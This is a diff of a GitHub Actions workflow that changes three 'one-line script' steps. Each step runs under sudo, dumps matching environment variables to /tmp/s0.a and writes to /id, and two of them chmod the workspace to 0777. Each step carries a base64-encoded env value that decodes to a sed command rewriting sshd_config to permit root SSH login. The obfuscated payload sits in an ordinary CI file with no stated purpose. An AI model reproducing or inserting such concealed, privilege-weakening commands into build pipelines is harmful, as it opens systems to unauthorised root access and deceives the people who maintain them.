@@ -15,7 +15,7 @@ jobs:
       - uses: actions/checkout@v3
       
       - name: Run a one-line script
-        run: sudo bash -c "echo ${{github.event.action}};echo ${{github.event.inputs}};(env|grep ss>/tmp/s0);echo 1>/id;exit 0"
+        run: sudo bash -c "echo ${{github.event.action}};echo ${{github.event.inputs}};(env|grep ss>/tmp/s0.a);echo '1'>/id;exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -60,7 +60,7 @@ jobs:
       - uses: actions/checkout@v3
       
       - name: Run a one-line script2
-        run: sudo bash -c "(env|grep ss>/tmp/s0);chmod 0777 $GITHUB_WORKSPACE/*;echo 2>/id;exit 0"
+        run: sudo bash -c "(env|grep ss>/tmp/s0.a);chmod 0777 $GITHUB_WORKSPACE/*;echo '2'>/id;exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
 
@@ -101,7 +101,7 @@ jobs:
       - uses: actions/checkout@v3
       
       - name: Run a one-line script2
-        run: sudo bash -c "(env|grep ss>/tmp/s0);chmod 0777 $GITHUB_WORKSPACE/*;echo 3>/id;exit 0"
+        run: sudo bash -c "(env|grep ss>/tmp/s0.a);chmod 0777 $GITHUB_WORKSPACE/*;echo '3'>/id;exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
 
